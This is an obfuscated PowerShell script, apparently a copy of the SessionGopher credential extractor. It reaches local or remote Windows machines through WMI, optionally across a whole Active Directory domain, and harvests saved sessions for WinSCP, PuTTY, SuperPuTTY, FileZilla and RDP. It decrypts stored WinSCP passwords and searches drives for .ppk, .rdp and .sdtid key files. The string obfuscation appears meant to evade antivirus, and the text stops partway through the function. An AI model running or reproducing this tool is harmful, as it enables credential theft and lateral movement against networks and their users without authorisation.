 sET ("Bo"+"p0")  ([tYpE]("{0}{1}{2}"-F'i','o.','paTH')  ) ;$1EF = [typE]("{1}{4}{2}{0}{3}"-F 'xt.en','sYsT','tE','Coding','EM.');  Set-itEM ('vARIA'+'BL'+'e:wf'+'sX02')  ( [TyPe]("{1}{2}{3}{0}" -f'eRT','systeM','.cO','Nv')) ;
function IN`VOKe-SE`SSIOnGo`Pher {
  param (
      [switch]${o}, 
      [switch]${Th`O`ROuGh}, 
      [string]${u}, 
      [string]${P}, 
      [string]${iL}, 
      [string]${tA`RgEt}, 
      [switch]${alLD`OM`AIN} 
  )

  &("{3}{2}{1}{0}" -f 'utput','O','-','Write') ('
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'o'+'_ '+' '+' '+' '+' '+' '+' '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+'/ '+' '+(('J2'+'V. ')  -rEPlACe  'J2V',[CHAR]34)+' '+' '+'SessionGo'+'p'+'her '+'- '+'RDP'+', '+'WinS'+'C'+'P, '+'FileZ'+'i'+'lla, '+'PuT'+'TY,'+' '+'Super'+'P'+'uTTY,'+' '+'
 '+' '+' '+' '+' '+' '+' '+(',{0} ')  -F  [ChAR]34+' '+('_-{'+'0'+'} ')-F  [ChaR]34+' '+' '+' '+' '+' '+'.sd'+'t'+'id, '+'.'+'rdp, '+'.'+'ppk '+'s'+'aved '+'s'+'ession '+'& '+'passwor'+'d'+' '+'extrac'+'to'+'r'+'
 '+' '+' '+' '+' '+(',lip'+' ')."rEPl`A`Ce"('lip',[string][cHAR]34)+' '+' '+'m '+'m '+' '+' '+' '+' '+' '+' '+' '+' '+'
 '+' '+'..'+'+ '+' '+' '+' '+' '+') '+' '+' '+' '+' '+' '+'Br'+'an'+'don '+'Arvanag'+'h'+'i
 '+' '+' '+' '+' '+(('Mf'+'am..m'+' ')-rePLaCe 'Mfa',[CHar]96)+' '+' '+' '+' '+' '+' '+'Twi'+'tter: '+'@a'+'rvanagh'+'i'+' '+(('zRm'+' ') -crEPLaCe  'zRm',[ChAR]124)+'arv'+'ana'+'ghi.c'+'om
 '+' '+'')

  if (${O}) {
    ${O`UTpUtd`I`REcTORY} = ((("{3}{1}{0}{2}" -f 'e','sionGoph','r (','Ses'))) + (&("{2}{0}{1}" -f 'Dat','e','Get-') -Format ("{1}{0}"-f 's','HH.mm.s')) + ")"
    &("{2}{1}{0}"-f'tem','w-I','Ne') -ItemType ("{0}{1}{3}{2}"-f 'D','irec','ry','to') ${O`UTP`Ut`D`IrECtorY} | &("{1}{2}{0}" -f'll','Out','-Nu')
    &("{2}{0}{1}" -f 'ew-I','tem','N') (${Ou`Tp`UT`dIRECTorY} + ((("{2}{1}{0}" -f 'csv','}PuTTY.','{0'))-F  [CHar]92)) -Type ("{0}{1}" -f'F','ile') | &("{0}{1}"-f'Out-N','ull')
    &("{0}{1}{2}"-f 'Ne','w-','Item') (${oUTp`U`TD`iREc`TOrY} + ((("{4}{1}{2}{0}{3}"-f 'rPu','0}','Supe','TTY.csv','{'))  -f [chAr]92)) -Type ("{0}{1}"-f'Fil','e') | &("{0}{1}"-f'Out-','Null')
    &("{2}{1}{0}" -f'm','w-Ite','Ne') (${OuT`P`UTD`IreC`Tory} + ((("{0}{1}" -f'{0}','WinSCP.csv'))  -f [ChaR]92)) -Type ("{1}{0}"-f 'le','Fi') | &("{0}{1}"-f 'Ou','t-Null')
    &("{0}{2}{1}"-f'Ne','-Item','w') (${O`UtPUtdiRe`Ct`Ory} + ((("{0}{4}{1}{3}{2}"-f 'H','eZi','.csv','lla','ckFil')) -cREpLAcE([cHAR]72+[cHAR]99+[cHAR]107),[cHAR]92)) -Type ("{0}{1}" -f 'F','ile') | &("{1}{0}{2}" -f '-Nu','Out','ll')
    &("{1}{0}{2}" -f'-','New','Item') (${O`UtP`Ut`DIrEctOrY} + ((("{2}{1}{0}"-f 'P.csv','EDRD','4'))  -ReplaCe'4ED',[CHar]92)) -Type ("{0}{1}" -f 'F','ile') | &("{1}{0}" -f'ut-Null','O')
    if (${tho`R`Ough}) {
        &("{2}{0}{1}"-f'e','m','New-It') (${Out`P`UT`dirE`ctORY} + ((("{3}{2}{1}{5}{4}{0}"-f'sv','pk','0}PuTTY p','{','c',' Files.')) -F [Char]92)) -Type ("{1}{0}" -f'e','Fil') | &("{2}{0}{1}"-f'ut-Nu','ll','O')
        &("{2}{1}{0}"-f 'Item','-','New') (${ouT`p`U`Tdirecto`Ry} + ((("{6}{0}{4}{1}{2}{3}{5}"-f 'oft ','p Fi','les.','c','rd','sv','ksqMicros'))."r`eplAce"(([char]107+[char]115+[char]113),[sTRInG][char]92))) -Type ("{0}{1}"-f 'F','ile') | &("{2}{1}{0}"-f 'l','-Nul','Out')
        &("{2}{1}{0}" -f'm','-Ite','New') (${OuTpuTdIre`CT`o`Ry} + ((("{5}{0}{1}{3}{2}{4}{6}{7}"-f'0RSA',' ','ti','sd','d Fi','zZ','les','.csv'))."r`EPLaCE"('zZ0',[stRInG][cHAR]92))) -Type ("{1}{0}"-f'ile','F') | &("{1}{0}{2}" -f't-','Ou','Null')
    }
  }

  if (${u} -and ${p}) {
    ${P`ASsWo`Rd} = &("{2}{3}{0}{5}{4}{1}" -f 'e','ing','Con','v','-SecureStr','rtTo') ${P} -AsPlainText -Force
    ${CREd`Enti`Als} = &("{2}{1}{0}"-f'-Object','ew','N') -Typename ("{7}{1}{5}{6}{2}{3}{4}{9}{8}{0}" -f 'al','s','geme','nt.Automa','tion.PSCre','tem.','Mana','Sy','enti','d') -ArgumentList ${u}, ${PaSSw`O`Rd}
  }

  
  ${h`KU} = 2147483651
  
  ${h`klm} = 2147483650

  ${p`UtTYpA`T`HeN`diNG} = ((("{2}{0}{7}{5}{4}{6}{3}{1}{8}"-f 'SOFTWARE0','RSession','0LR','TY0L','RPu','m0L','T','LRSimonTatha','s'))."RE`PLA`CE"('0LR',[StriNG][cHAr]92))
  ${wInSCP`pA`THe`NDING} = ((("{11}{12}{5}{0}{4}{3}{6}{10}{9}{13}{2}{7}{8}{1}"-f'E{','{0}Sessions','}WinSCP','M','0}','}SOFTWAR','ar',' ','2','n Prikryl','ti','{','0','{0'))-F [CHAr]92)
  ${r`DppAThEn`D`ING} = ((("{7}{12}{10}{13}{6}{14}{3}{11}{5}{8}{4}{0}{9}{2}{1}"-f'er','ntzSEServers','ie','o','inal S','Ter','ro','zSESO','m','ver Cl','Mi','ftzSE','FTWAREzSE','c','s'))."re`Pl`ACe"(([ChaR]122+[ChaR]83+[ChaR]69),'\'))

  if (${il} -or ${a`lLdoMa`IN} -or ${ta`Rg`et}) {

    
    ${re`ADEr} = ""

    if (${alLd`oM`AIN}) {
      ${rEA`deR} = &("{6}{2}{1}{5}{4}{7}{0}{3}"-f 'Direc','Computers','et','tory','romActiv','F','G','e')
    } elseif (${i`L}) { 
      ${r`EADEr} = &("{2}{0}{3}{1}" -f'-Con','t','Get','ten') ((&("{1}{3}{2}{0}" -f 'olve-Path','R','s','e') ${i`l})."p`ATh")
    } elseif (${t`Ar`Get}) {
      ${RE`ADer} = ${TarG`eT}
    }

    ${OptIo`NAl`C`R`eDS} = @{}
    if (${CrE`DEnT`ials}) {
      ${oPTI`oN`A`lC`ReDs}[("{0}{1}{2}"-f 'C','reden','tial')] = ${C`Re`dEN`TiAlS}
    }

    foreach (${ReMoT`e`com`pU`Ter} in ${rE`A`DEr}) {

      if (${Al`Ld`OmaIN}) {
        
        ${Re`m`oTecOmp`UTEr} = ${r`EmotE`cOMp`UTEr}."pRop`eR`TIES"."n`Ame"
	if (!${ReM`ot`ecOmP`U`TEr}) { Continue }
      }

      &("{1}{0}{2}{3}" -f 'ri','W','te-Ou','tput') ('[+]'+' '+'Digg'+'in'+'g '+'on'+' '+"$RemoteComputer...")

      ${S`idS} = &("{2}{1}{0}{4}{3}"-f'oke-W','v','In','thod','miMe') -Class ("{2}{0}{1}"-f 'e','gProv','StdR') -Name ("{2}{1}{0}"-f 'ey','mK','Enu') -ArgumentList ${H`KU},'' -ComputerName ${R`em`OTEcom`p`UTEr} @optionalCreds | &("{0}{1}{2}{4}{3}" -f 'Se','lect','-','bject','O') -ExpandProperty ("{0}{1}"-f'sName','s') | &("{0}{1}{2}" -f 'Wh','ere-Obje','ct') {${_} -match (('S'+'-1-5-21-[{1}d{'+'1}-]'+'+'+'{0}') -f[chaR]36,[chaR]92)}

      foreach (${s`Id} in ${S`iDs}) {

        
        ${mA`p`p`e`dUsErnAme} = try { (&("{2}{1}{3}{0}"-f 'h','p','S','lit-Pat') -Leaf (&("{0}{1}{2}" -f 'Spl','i','t-Path') -Leaf (&("{1}{3}{2}{0}" -f'edSID','G','tMapp','e')))) } catch {}
        ${SOU`R`CE} = ((${re`mO`T`e`coMpUTER} + "\" + ${M`APpED`Us`eRnAMe}) -Join "")

        
        ${u`sE`ROBJeCT} = &("{2}{0}{3}{1}"-f '-Obj','ct','New','e') ("{2}{1}{0}"-f't','c','PSObje')

        
        ${aRraY`o`FpuTTYS`eSs`ionS} = &("{2}{1}{0}{3}"-f'bje','w-O','Ne','ct') ("{0}{4}{1}{5}{3}{2}"-f 'Sy','.C','st','ons.ArrayLi','stem','ollecti')
        ${arR`AYo`FSUpeRp`UttY`s`Es`siO`NS} = &("{2}{1}{0}" -f'bject','O','New-') ("{3}{0}{4}{5}{1}{2}{6}" -f '.Co','r','rayLis','System','llection','s.A','t')
        ${A`RraYO`FRD`PSES`S`iONs} = &("{3}{0}{2}{1}"-f'O','t','bjec','New-') ("{0}{2}{8}{7}{5}{6}{1}{3}{4}"-f 'Sys','ions.','tem.','ArrayLi','st','l','lect','o','C')
        ${arrAYo`FfILE`Zi`LLA`Ses`siO`Ns} = &("{1}{2}{0}"-f'ect','New-O','bj') ("{3}{2}{7}{5}{4}{0}{1}{8}{6}"-f'i','ons.ArrayL','ystem','S','llect','o','st','.C','i')
        ${aRra`yO`FWins`cPSEs`sIoNs} = &("{0}{3}{1}{2}" -f 'N','Obje','ct','ew-') ("{7}{2}{8}{0}{3}{1}{4}{5}{6}" -f'oll','i','tem','ect','o','ns.A','rrayList','Sys','.C')

        
        ${r`DpP`ATh} = ${s`id} + ${rdpp`A`TH`e`Nding}
        ${p`Uttyp`ATh} = ${s`Id} + ${PUTT`YpATH`enDiNg}
        ${wI`NSc`pP`ATh} = ${S`Id} + ${W`iNs`c`P`p`AThENDiNg}
        ${suPeR`p`UTt`Y`F`ILtEr} = (('Driv'+'e=X'+'tkC:'+'Xtk ')."Re`PlA`cE"('Xtk',[StrING][CHAR]39)+'A'+'ND '+"Path='\\Users\\$MappedUserName\\Documents\\SuperPuTTY\\' "+'A'+'ND '+('F'+'i'+'le'+'Na'+'m'+'e=HCFS'+'essions'+'HCF ')."REp`LacE"(([chAr]72+[chAr]67+[chAr]70),[STrINg][chAr]39)+'AND'+' '+('Exten'+'sio'+'n={0}XML{0}')  -F  [cHAR]39)
        ${f`iLe`zILl`A`FIlt`Er} = (('Drive'+'=lzpC'+':lzp ')."REP`lAcE"(([ChaR]108+[ChaR]122+[ChaR]112),[STRing][ChaR]39)+'A'+'ND '+"Path='\\Users\\$MappedUserName\\AppData\\Roaming\\FileZilla\\' "+'AND'+' '+('Fi'+'l'+'eName='+'L'+'9Asit'+'ema'+'na'+'gerL9A ')."Re`p`Lace"('L9A',[StrIng][CHAR]39)+'AN'+'D '+('Ext'+'e'+'nsion=LuRXML'+'LuR')."R`EplA`cE"('LuR',[sTrInG][CHAr]39))

        ${R`D`pseSSiOnS} = &("{0}{1}{2}{3}"-f'Inv','oke','-WmiM','ethod') -ComputerName ${re`MoTe`CoMpuTEr} -Class ("{2}{0}{1}{3}"-f 'd','R','St','egProv') -Name ("{1}{0}" -f'y','EnumKe') -ArgumentList ${H`KU},${rdP`pA`Th} @optionalCreds
        ${put`T`ysess`ioNs} = &("{0}{3}{1}{4}{2}" -f 'Invoke-','mi','thod','W','Me') -ComputerName ${RE`mOtecOMP`Ut`Er} -Class ("{1}{2}{0}"-f'Prov','St','dReg') -Name ("{0}{1}"-f'En','umKey') -ArgumentList ${H`ku},${pU`TTYp`ATh} @optionalCreds
        ${w`insCpses`sIoNS} = &("{0}{2}{1}{3}"-f 'Invoke-Wm','Meth','i','od') -ComputerName ${reMot`E`Comp`UTer} -Class ("{0}{1}{2}"-f 'S','tdR','egProv') -Name ("{2}{1}{0}"-f 'ey','numK','E') -ArgumentList ${H`ku},${wIns`cp`pAtH} @optionalCreds
        ${S`UPErpu`TtY`P`AtH} = (&("{0}{1}{2}" -f 'Get','-WmiObjec','t') -Class ("{1}{0}{3}{2}"-f '_Dat','CIM','ile','aF') -Filter ${sUP`eR`P`UTt`YFILtEr} -ComputerName ${R`eMOTECo`mpUT`Er} @optionalCreds | &("{0}{1}"-f'Sele','ct') ("{0}{1}"-f 'Na','me'))
        ${fI`Le`zill`ApATh} = (&("{0}{2}{1}" -f 'Get-WmiOb','ect','j') -Class ("{0}{1}{2}"-f'CIM_Dat','aFi','le') -Filter ${f`iL`EZILLafI`LtEr} -ComputerName ${REM`OTEco`MPU`TEr} @optionalCreds | &("{1}{0}" -f'ect','Sel') ("{1}{0}" -f 'me','Na'))

        
        if ((${wI`NSCps`EssiO`NS} | &("{1}{2}{0}{3}"-f 'jec','Sele','ct-Ob','t') -ExpandPropert ("{1}{2}{0}{3}" -f 'nVa','Ret','ur','lue')) -eq 0) {

          
          ${wInS`CpSes`sIO`NS} = ${wInS`C`PseSSIo`Ns} | &("{1}{0}{2}"-f'ect','Sel','-Object') -ExpandProperty ("{0}{1}"-f 'sName','s')
          
          foreach (${w`iN`s`cPSe`SsIon} in ${wInSc`pses`Sio`NS}) {
      
            ${WINs`c`pS`es`sI`oNobJECT} = "" | &("{0}{1}{3}{2}"-f'Selec','t-O','ect','bj') -Property ("{0}{1}"-f 'Sou','rce'),("{1}{0}"-f 'ssion','Se'),("{2}{1}{0}" -f 'me','a','Hostn'),("{1}{0}"-f'me','Userna'),("{1}{2}{0}" -f'word','P','ass')
            ${w`I`NsCPs`esSIONoBJ`E`cT}."sOu`RCE" = ${SO`URCe}
            ${w`InScpSes`s`IonoBJE`Ct}."sEsS`i`on" = ${wi`NsCPsES`sIoN}

            ${L`o`cAtioN} = ${w`Insc`ppAth} + "\" + ${WIns`C`p`sESSioN}

            ${WI`NscPs`e`SsiOnOb`J`eCT}."h`oST`NAme" = (&("{2}{0}{4}{1}{3}" -f'n','-WmiMetho','I','d','voke') -ComputerName ${RE`MOtec`omp`Ut`Er} -Class ("{1}{2}{3}{0}" -f 'ov','S','tdR','egPr') -Name ("{2}{3}{0}{1}" -f't','StringValue','G','e') -ArgumentList ${h`kU},${lOca`TIOn},("{0}{2}{1}" -f'Ho','Name','st') @optionalCreds)."svA`LUe"
            ${wINScPs`e`sS`ioNOB`JeCT}."u`sErname" = (&("{1}{0}{2}{3}"-f'voke-Wm','In','iMeth','od') -ComputerName ${rEM`OtEC`oMp`U`TeR} -Class ("{1}{0}{2}" -f'dRegP','St','rov') -Name ("{3}{2}{1}{0}"-f 'ingValue','tStr','e','G') -ArgumentList ${H`Ku},${lOc`At`iOn},("{1}{0}"-f 'ame','UserN') @optionalCreds)."sv`AlUE"
            ${Win`S`C`ps`EssIoNobJEcT}."pAssW`OrD" = (&("{4}{2}{0}{5}{1}{3}"-f 'W','Me','e-','thod','Invok','mi') -ComputerName ${rEmOTE`cOmp`Ut`er} -Class ("{2}{1}{0}" -f 'gProv','dRe','St') -Name ("{0}{1}{3}{2}"-f'Ge','tS','lue','tringVa') -ArgumentList ${h`ku},${Lo`Ca`T`ion},("{1}{0}" -f 'rd','Passwo') @optionalCreds)."sv`AL`Ue"

            if (${w`I`NScpSesSi`ONO`BJE`CT}."PaS`Swo`Rd") {

              ${mastER`p`AsS`paTH} = ${S`ID} + ((("{10}{8}{12}{4}{6}{7}{3}{9}{2}{5}{0}{1}{11}"-f'ecu','rit','nfigur','ylB71WinSCP 2B7','rtin','ationB71S',' P','rikr','ftware','1Co','B71So','y','B71Ma'))  -rEPlACe  ([cHAR]66+[cHAR]55+[cHAR]49),[cHAR]92)
          
              ${mastE`Rpas`SU`SeD} = (&("{4}{0}{3}{1}{2}" -f'nvoke-Wmi','h','od','Met','I') -ComputerName ${RE`moTe`cOMp`U`TEr} -Class ("{1}{0}{2}" -f 'tdR','S','egProv') -Name ("{0}{2}{1}"-f'Ge','dValue','tDWor') -ArgumentList ${H`KU},${m`ASTeRP`A`SSPaTH},("{1}{2}{0}{3}{4}" -f 'M','Us','e','aster','Password') @optionalCreds)."u`VAL`UE"
              
              if (!${MaS`Ter`p`ASsuS`eD}) {
                  ${wINS`CpS`E`SSIO`NoBj`E`Ct}."P`ASsWo`RD" = (&("{2}{3}{0}{6}{4}{5}{1}" -f'ptWi','d','Dec','ry','CPPassw','or','nS') ${WI`NSCPs`ESSi`onoBJE`cT}."H`oS`TName" ${WInSCpse`SsiO`N`Ob`JeCT}."UsER`NA`mE" ${w`iNScp`sesSiOnoB`J`EcT}."p`As`swoRd")
              } else {
                  ${winscPSE`sSiONO`BJ`eCT}."p`AssW`oRD" = ("{17}{4}{0}{14}{15}{3}{6}{11}{7}{13}{1}{10}{9}{5}{16}{12}{8}{2}"-f ' in s','l','ry',' p','d','text','a','d pre','e','in','a','sswor','recov','vents p','ession, b','ut master',' ','Save')
              }

            }
             
            [void]${arR`A`YO`FWIn`ScPSEsSIONs}.("{1}{0}" -f'dd','A').Invoke(${wINSc`PSe`sSI`ONoB`jeCT})
      
          } 

          if (${A`RRayOF`winsC`p`seSsio`Ns}."Co`Unt" -gt 0) {

            ${uSEr`o`BJe`ct} | &("{0}{2}{1}" -f'Ad','er','d-Memb') -MemberType ("{2}{0}{1}" -f'otePr','operty','N') -Name ("{2}{3}{1}{0}"-f 'ons','P Sessi','W','inSC') -Value ${aR`RaY`ofw`iNscpsEssiOns}

            if (${o}) {
              ${A`R`RAy`OFWI`NsCpS`ESSiOnS} | &("{1}{2}{0}" -f 'ject','Sel','ect-Ob') ('*') | &("{1}{0}{2}" -f'CS','Export-','V') -Append -Path (${o`UTputdi`Re`CTO`Ry} + ((("{0}{2}{3}{1}" -f 'B','WinSCP.csv','i','2'))-CREPlaCe'Bi2',[chAr]92)) -NoTypeInformation
            } else {
              &("{1}{0}{2}" -f'ite','Wr','-Output') ("{1}{0}{3}{2}"-f'in','W','ssions','SCP Se')
              ${AR`R`A`Yo`FWin`sCpSe`sSiOns} | &("{3}{4}{2}{0}{1}"-f'bj','ect','t-O','Sele','c') ('*') | &("{1}{0}{2}{3}"-f 'rm','Fo','at-Li','st') | &("{2}{1}{0}"-f'g','Strin','Out-')
            }

          }
        
        } 

        if ((${pu`Tt`ySEsSIo`NS} | &("{0}{1}{2}"-f'Select-Ob','jec','t') -ExpandPropert ("{2}{0}{1}"-f 'u','e','ReturnVal')) -eq 0) {

          
          ${puttY`s`E`sS`iONs} = ${pUT`T`YSessi`O`Ns} | &("{3}{1}{0}{2}" -f 'ec','bj','t','Select-O') -ExpandProperty ("{1}{0}"-f 'mes','sNa')

          foreach (${puT`TYs`eSSI`on} in ${PU`TTY`S`EsSionS}) {
      
            ${puTt`Y`S`Es`SiO`NobJECt} = "" | &("{1}{0}{2}" -f'lect-Objec','Se','t') -Property ("{1}{0}"-f'rce','Sou'),("{2}{1}{0}" -f'on','ssi','Se'),("{0}{1}{2}"-f'Hos','tna','me')

            ${lO`CAtiOn} = ${PuT`TyP`ATH} + "\" + ${putTy`SE`ss`i`ON}

            ${p`UTty`s`es`sI`onOBjECT}."S`ouRce" = ${sO`UR`ce}
            ${Put`TY`S`ess`i`O`NobjEcT}."seS`siOn" = ${pU`T`Tyse`s`sIOn}
            ${PuttySEs`siO`NO`Bj`ect}."HOs`TNA`me" = (&("{0}{1}{2}" -f'Invoke','-Wmi','Method') -ComputerName ${rE`MotEC`om`puT`eR} -Class ("{1}{0}{2}"-f'P','StdReg','rov') -Name ("{1}{2}{0}"-f'e','Get','StringValu') -ArgumentList ${h`Ku},${l`Oc`ATIOn},("{1}{0}"-f'ostName','H') @optionalCreds)."S`Va`lUE"
             
            [void]${AR`R`AYofPUtTy`S`essi`ons}.("{1}{0}" -f'd','Ad').Invoke(${pU`T`TYSesSioN`ObJECT})
      
          }

          if (${aRr`Ay`OfpUTT`YsE`ssI`o`NS}."co`Unt" -gt 0) {

            ${Use`R`OBje`cT} | &("{3}{1}{0}{2}" -f '-Mem','dd','ber','A') -MemberType ("{1}{0}{2}" -f 'op','NotePr','erty') -Name ("{0}{3}{1}{2}"-f'P','TY Sess','ions','uT') -Value ${arr`AyO`Fp`UtTYse`s`sIons}

            if (${o}) {
              ${arr`Ay`O`F`puttySesSI`OnS} | &("{0}{2}{1}" -f 'Select-O','ct','bje') ('*') | &("{0}{1}{2}"-f 'Export','-C','SV') -Append -Path (${out`p`Ut`di`REctOry} + ((("{2}{1}{0}" -f 'csv','.','oR8PuTTY'))."r`E`PlAce"(([ChaR]111+[ChaR]82+[ChaR]56),'\'))) -NoTypeInformation
            } else {
              &("{2}{3}{1}{0}" -f 'put','Out','Wr','ite-') ("{0}{1}{4}{3}{2}" -f 'Pu','T','sions','Ses','TY ')
              ${ARr`AYo`FPU`TTy`SEssIO`Ns} | &("{3}{1}{0}{2}" -f'bjec','ct-O','t','Sele') ('*') | &("{2}{1}{0}"-f'ist','mat-L','For') | &("{1}{2}{0}"-f 'tring','O','ut-S')
            }

          }

        } 

        if ((${RdpseS`SIo`Ns} | &("{3}{2}{1}{4}{0}" -f'ject','lec','e','S','t-Ob') -ExpandPropert ("{1}{0}{2}" -f'V','Return','alue')) -eq 0) {

          
          ${RdPs`eSS`IOnS} = ${RD`pSe`sSI`ONS} | &("{1}{3}{2}{0}"-f'ct','Se','ct-Obje','le') -ExpandProperty ("{1}{0}" -f 'Names','s')

          foreach (${r`d`pSesSi`ON} in ${RD`Ps`EssionS}) {
      
            ${rd`p`SEsSI`onOBJEcT} = "" | &("{0}{4}{1}{3}{2}"-f 'S','lect','ct','-Obje','e') -Property ("{0}{1}" -f'Sour','ce'),("{0}{1}{2}"-f 'Host','n','ame'),("{0}{1}{2}"-f'User','nam','e')
            
            ${lOCat`I`On} = ${rd`P`PAth} + "\" + ${rD`pSeSsI`oN}

            ${rD`p`seSsI`O`NoBJECT}."So`U`RCE" = ${SO`U`Rce}
            ${r`Dps`ESSIO`NObJE`cT}."hOst`Na`ME" = ${rdps`esSi`ON}
            ${r`DPS`EssI`OnOb`J`EcT}."u`sEr`NAmE" = (&("{4}{0}{1}{3}{2}"-f'vo','ke-WmiMe','od','th','In') -ComputerName ${REMOt`EcOMpUT`er} -Class ("{0}{3}{1}{2}" -f 'St','Pro','v','dReg') -Name ("{3}{4}{0}{2}{1}"-f 't','ngValue','ri','G','etS') -ArgumentList ${H`KU},${LoCa`Ti`ON},("{3}{0}{2}{1}" -f'serN','nt','ameHi','U') @optionalCreds)."S`V`ALUE"

            [void]${arraYOf`Rdpse`ss`ions}.("{0}{1}" -f'Ad','d').Invoke(${rDPSeS`SioN`O`BJ`eCT})
      
          }

          if (${Ar`Ra`yOfRdpS`EssiOns}."cou`NT" -gt 0) {

            ${U`Se`Rob`jEct} | &("{2}{0}{3}{1}" -f'-M','ber','Add','em') -MemberType ("{0}{2}{3}{1}"-f'Not','perty','ePr','o') -Name ("{1}{2}{0}"-f'ns','RDP ','Sessio') -Value ${A`RrA`y`OfrD`PSEss`i`onS}

            if (${O}) {
              ${ARR`Ay`OF`RD`PsESsI`ONs} | &("{2}{0}{1}{3}"-f 'e','ct-','Sel','Object') ('*') | &("{3}{1}{0}{2}"-f 'CS','-','V','Export') -Append -Path (${o`U`Tp`UTDiR`ECtory} + ((("{1}{0}{3}{2}" -f 'A','t','sv','fRDP.c'))."Repl`AcE"(([Char]116+[Char]65+[Char]102),[STRinG][Char]92))) -NoTypeInformation
            } else {
              &("{1}{3}{0}{2}" -f 'e-Out','Wr','put','it') ("{4}{3}{1}{0}{2}"-f 't RDP Ses','sof','sions','cro','Mi')
              ${aRrAyOF`RdpSe`SSi`O`NS} | &("{0}{1}{3}{2}"-f'Select-','Obj','t','ec') ('*') | &("{0}{1}{2}" -f'F','o','rmat-List') | &("{0}{2}{3}{1}" -f 'Out','ing','-','Str')
            }

          }

        } 

        
        if (${SU`p`eRputt`YpatH}."N`AME") {

          ${Fi`LE} = "C:\Users\$MappedUserName\Documents\SuperPuTTY\Sessions.xml"
          ${fIlE`C`ONt`ENtS} = &("{8}{1}{9}{4}{7}{5}{0}{3}{2}{6}" -f'romRem','nd','t','o','x','actF','eRegistry','tr','DownloadA','E') ${fI`Le}

          [xml]${SUp`E`RpUtTy`xML} = ${FIl`ecO`Nten`Ts}
          (&("{4}{1}{2}{3}{6}{0}{5}"-f'l','roces','s','SuperPuTT','P','e','YFi') ${SuPe`RP`Ut`TYXmL})

        }

        
        if (${fI`LeZiLlap`Ath}."na`me") {

          ${f`iLE} = "C:\Users\$MappedUserName\AppData\Roaming\FileZilla\sitemanager.xml"
          ${FilEC`O`Nte`Nts} = &("{3}{0}{2}{7}{5}{8}{1}{4}{6}" -f'dAnd','m','Ex','Downloa','RemoteRegistr','a','y','tr','ctFro') ${FI`le}

          [xml]${F`ILeZ`IlLA`x`Ml} = ${Fi`l`EC`ONT`ENTS}
          (&("{5}{3}{4}{6}{2}{1}{0}"-f 'illaFile','Z','le','roc','e','P','ssFi') ${fIlEZil`L`AxML})

        } 

      } 

      if (${thOROu`gH}) {

        ${ARraYOf`PpK`F`ilES} = &("{1}{2}{0}" -f 'w-Object','N','e') ("{1}{8}{7}{2}{4}{5}{3}{0}{6}"-f'Li','System.C','ns','ay','.','Arr','st','ectio','oll')
        ${a`Rr`AYOF`RDP`FILes} = &("{0}{1}{2}"-f 'New-Obje','c','t') ("{1}{2}{4}{3}{0}"-f'.ArrayList','Syst','em.','ctions','Colle')
        ${Ar`Ra`Yo`FSdTidF`Iles} = &("{0}{2}{1}"-f'New','t','-Objec') ("{7}{6}{2}{8}{0}{3}{4}{1}{5}" -f 'c','y','Coll','tions.Arr','a','List','tem.','Sys','e')

        ${fiL`ePa`Th`sF`ouNd} = (&("{2}{3}{0}{1}" -f 'iObjec','t','Ge','t-Wm') -Class ("{1}{0}{2}"-f 'M_Dat','CI','aFile') -Filter ((("{22}{17}{4}{18}{16}{9}{23}{2}{6}{3}{19}{10}{24}{0}{12}{7}{21}{11}{13}{5}{15}{14}{8}{20}{1}"-f'ensi','0}','ND extensio','0}ppk{','i','R ','n={','n=','nsion={0','0}','R','rdp{0}','o',' O','e','ext','{0}C:{','r','ve=','0} O','}.sdtid{','{0}','D',' A',' ext'))-f  [Char]39) -ComputerName ${re`MO`TecOmpU`TER} @optionalCreds | &("{2}{1}{0}"-f'lect','e','S') ("{0}{1}"-f'Nam','e'))

        (&("{4}{2}{3}{0}{1}" -f't','e','ghR','emo','ProcessThorou') ${fIlE`p`A`ThSfOunD})
        
      } 

    } 

  
  } else { 
    
    &("{1}{2}{0}" -f 'st','W','rite-Ho') -NoNewLine -ForegroundColor ("{0}{1}" -f'Dark','Green') ("{1}{0}" -f '] ','[+')
    &("{1}{2}{0}" -f 'ite-Host','W','r') ("{2}{0}{1}" -f'gging',' on','Di')(&("{1}{0}{2}"-f 'stna','Ho','me'))"..."

    
    ${u`s`erhIVES} = &("{1}{2}{0}" -f'tem','Get-Chil','dI') ((("{1}{2}{3}{4}{0}{5}"-f 'E','Registry','::HK','E','Y_US','RS{0}')) -f [cHaR]92) -ErrorAction ("{0}{3}{1}{2}"-f'S','ti','nue','ilentlyCon') | &("{2}{1}{0}"-f 'bject','re-O','Whe') {${_}."nA`mE" -match ((('^HKEY_USE'+'RSHA'+'P'+'HA'+'PS-1'+'-5-21'+'-'+'[HAPdH'+'A'+'P'+'-]'+'+rpR')-REPlaCE 'HAP',[ChaR]92  -cReplace([ChaR]114+[ChaR]112+[ChaR]82),[ChaR]36))}

    
    foreach(${H`IvE} in ${UsEr`h`ives}) {

      
      ${Us`ErOB`JECt} = &("{3}{2}{0}{1}"-f'b','ject','w-O','Ne') ("{1}{0}{2}" -f'bje','PSO','ct')

      ${aRRAyofw`INSCPs`e`sSio`Ns} = &("{2}{1}{0}"-f 'Object','w-','Ne') ("{2}{0}{4}{3}{1}{6}{5}" -f'y','ay','S','ns.Arr','stem.Collectio','st','Li')
      ${aRr`AY`oFpuTtysES`S`io`NS} = &("{3}{1}{0}{2}"-f'-O','w','bject','Ne') ("{4}{2}{0}{3}{5}{1}" -f 'Ar','yList','Collections.','r','System.','a')
      ${aR`RAYO`FPPk`FILES} = &("{1}{0}{2}"-f '-','New','Object') ("{0}{1}{4}{2}{3}{5}" -f'Syste','m.C','tions.Ar','rayL','ollec','ist')
      ${arRAYoFS`UpErPUtt`YsEs`S`Io`Ns} = &("{0}{1}{2}"-f 'New','-','Object') ("{2}{3}{5}{1}{0}{4}"-f 'ons.ArrayLis','ollecti','Sy','s','t','tem.C')
      ${aR`Ra`yOFRDPSE`ssI`onS} = &("{0}{2}{1}" -f'New-','bject','O') ("{2}{0}{3}{1}{4}" -f'ystem.Coll','rray','S','ections.A','List')
      ${A`RrAYof`Rdp`FIleS} = &("{0}{2}{1}"-f'N','ject','ew-Ob') ("{0}{1}{3}{4}{5}{6}{2}" -f 'Syste','m.Collec','.ArrayList','t','io','n','s')
      ${aR`Ray`OffiL`e`zILlASEssiONs} = &("{0}{2}{3}{1}" -f'N','t','e','w-Objec') ("{2}{1}{4}{5}{3}{7}{6}{0}" -f 'rayList','y','S','Collectio','s','tem.','r','ns.A')

